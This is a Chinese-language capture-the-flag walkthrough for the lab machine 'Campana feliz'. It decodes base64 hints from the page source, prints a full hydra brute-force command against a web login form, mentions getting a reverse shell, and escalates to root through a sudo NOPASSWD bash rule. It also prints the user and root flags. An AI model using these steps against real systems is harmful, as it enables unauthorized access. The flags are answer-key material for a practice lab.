# Campana feliz

2025.02.26 https://thehackerslabs.com/campana-feliz/

## Ip

192.168.5.40

## Scan

```
PORT      STATE SERVICE
22/tcp    open  ssh
8088/tcp  open  radan-http
10000/tcp open  snet-sensor-mgmt
```

先访问 http://192.168.5.40:8088/ 空页面，源码中有注释：

```
<!-- Q2FtcGFuYSBzb2JyZSBjYW1wYW5hCgpZIHNvYnJlIGNhbXBhbmEgdW5hCgpBc8OzbWF0ZSBhIGxhIHZlbnRhbmEKClZlcsOhcyBlbCBuacOxbyBlbiBsYSBjdW5hCg== -->
<!-- Q2FtcGFuYSBDYW1wYW5hIENhTXBBTkEgQ2FNcGFOYQo= -->
```

进行 base64 解码得到：

```
Campana sobre campana

Y sobre campana una

Asómate a la ventana

Verás el niño en la cuna
```

```
Campana Campana CaMpANA CaMpaNa
```

西班牙语进行翻译，在说一个名字 Campana 可能是个登陆用户名。gobuster 扫描 8088 发现页面 http://192.168.5.40:8088/shell.php 需要用户名和密码进行登陆。

访问 10000 端口跳转到 https://192.168.5.40:10000/ 显示的是 Webmin ，尝试了默认的 root 和 admin 凭据都不能登陆。

尝试了用这几个单词作为密码 Campana Campana CaMpANA CaMpaNa 在 8088 页面登陆 Campana 用户，但是都不对，只好尝试使用 rockyou：

```
hydra -t 32 -l campana -P /usr/share/wordlists/rockyou.txt 192.168.5.40 -s 8088 -f http-post-form "/shell.php:username=^USER^&password=^PASS^:F=Username or password invalid"

[8088][http-post-form] host: 192.168.5.40   login: campana   password: lovely
```

登陆成功，发现可以执行命令，执行反弹到 kali 上，发现 bob 用户，需要提权，sudo -l 发现：

```
(ALL) NOPASSWD: /bin/bash
```

直接提升到 root 权限,读取 user flag 和 root flag：

```
www-data@debian:/home$ sudo -u root /bin/bash
root@debian:/home# cd bon
bash: cd: bon: No such file or directory
root@debian:/home# cd bob
root@debian:/home/bob# ls
user.txt
root@debian:/home/bob# cat user.txt
R1aZp7qLdV8MnYX9bQ2wNC5kW3TYoJV
root@debian:/home/bob# cd /root
root@debian:~# ls
root.txt  webmin-1.920	webmin-1.920.tar.gz
root@debian:~# cat root.txt
u5T7vCnO1pQ2zRwX8gLdN6bJyK3mVxY
```
